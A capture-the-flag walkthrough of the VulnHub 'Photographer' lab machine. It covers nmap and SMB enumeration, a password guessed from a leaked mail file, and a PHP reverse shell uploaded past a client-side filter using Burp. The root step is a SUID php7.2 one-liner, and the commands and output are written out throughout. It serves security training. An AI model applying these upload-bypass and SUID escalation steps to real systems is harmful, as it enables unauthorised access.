# Photographer | VulnHub
https://www.vulnhub.com/entry/photographer-1,519/

### 1. Scan
```bash
# Nmap 7.91 scan initiated Sun Jun  6 04:14:26 2021 as: nmap -vv -A -p- -oG /home/kali/Desktop/results/192.168.34.132/scans/gnmap/_full_tcp_nmap.gnmap -oN /home/kali/Desktop/results/192.168.34.132/scans/_full_tcp_nmap.txt -oX /home/kali/Desktop/results/192.168.34.132/scans/xml/_full_tcp_nmap.xml 192.168.34.132
Nmap scan report for 192.168.34.132
Host is up, received arp-response (0.00050s latency).
Scanned at 2021-06-06 04:14:27 EDT for 55s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT     STATE SERVICE      REASON         VERSION
80/tcp   open  http         syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn  syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn  syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  ssl/http-alt syn-ack ttl 64 Apache/2.4.18 (Ubuntu)
|_http-generator: Koken 0.22.24
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
MAC Address: 00:0C:29:6A:1D:2F (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/6%OT=80%CT=1%CU=30831%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=60BC841A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%CI=I%II=I%
OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 12.587 days (since Mon May 24 14:09:59 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   PHOTOGRAPHER<00>     Flags: <unique><active>
|   PHOTOGRAPHER<03>     Flags: <unique><active>
|   PHOTOGRAPHER<20>     Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41096/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 47007/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44736/udp): CLEAN (Timeout)
|   Check 4 (port 26921/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2021-06-06T04:15:10-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-06T08:15:12
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.34.132

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun  6 04:15:22 2021 -- 1 IP address (1 host up) scanned in 56.05 seconds
```
The machine is running two web servers on 80 and 8000, and SMB.

### 2. Look at SMB
There is a share on SMB with some files.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ smbclient //192.168.34.132/sambashare                          
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 20 21:30:07 2020
  ..                                  D        0  Tue Jul 21 05:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (35.1 KiloBytes/sec) (average 35.1 KiloBytes/sec)
smb: \> exit
```
Reading the mailsent file:
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```
There is a site somewhere, which has a secret. Good to know.

### 3. Find the site
The website on port 80 is pretty bare with not much to go on. It is just a template site with placeholder text. However on the other website on the port 8000 webserver is a Koken gallery instance. By going to http://192.168.34.132:8000/admin, the gallery admin page can be found. Using the clues provided in the file retrieved from SMB, log in with `daisy@photographer.com:babygirl`.

### 4. Get a shell
With access to the gallery backend, there is a facility to upload photos. Some experiemation reveals that the app will filter on non-image extensions. Not ideal but can be bypassed because this check is client-side only. Create a php reverse shell called "rev.jpg", then go to upload the file, intercept the request in burp and change the parameters: "name" and "filename" so the filename is now "rev.php". The Content-Type can be left as `image/jpeg`
  
Once the file is uploaded, click to the file in the front end of the gallery and access the full version to trigger the reverse shell, which is recieved over a netcat listener.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999           
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.132] 42930
Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:28:06 up 38 min,  0 users,  load average: 0.33, 0.65, 0.34
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@photographer:/$
```

### 5. Enumerate from foothold
Check out /etc/passwd:
```bash
www-data@photographer:/usr/bin$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
agi:x:1001:1001:,,,:/home/agi:/bin/bash
daisa:x:1000:1000:daisa:/home/osboxes:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
```
Dasia has a account, but "babygirl" is not her password this time. I also grabbed the database credentials out of the koken config, but Dasia is the only user.  
From here ran LinEnum and noticed something among for the discovered SUID files.
```bash
[-] SUID files:
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 10584 Apr  8 10:44 /usr/lib/xorg/Xorg.wrap
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18664 Mar 18  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /usr/sbin/pppd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 4883680 Jul  9  2020 /usr/bin/php7.2
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
```
There is a binary called "php7.2" which has the root SUID bit set. If this is actually PHP, privilege escalation is possible.
```bash
www-data@photographer:/tmp$ /usr/bin/php7.2 -v
PHP 7.2.32-1+ubuntu16.04.1+deb.sury.org+1 (cli) (built: Jul  9 2020 16:33:33) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.32-1+ubuntu16.04.1+deb.sury.org+1, Copyright (c) 1999-2018, by Zend Technologies
```
Looks like it is.

### 6. Escalate to root
Because PHP is SUID, it can be leveraged to go straight to root by executing /bin/sh.
```bash
www-data@photographer:/usr/bin$ ./php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
whoami
root
```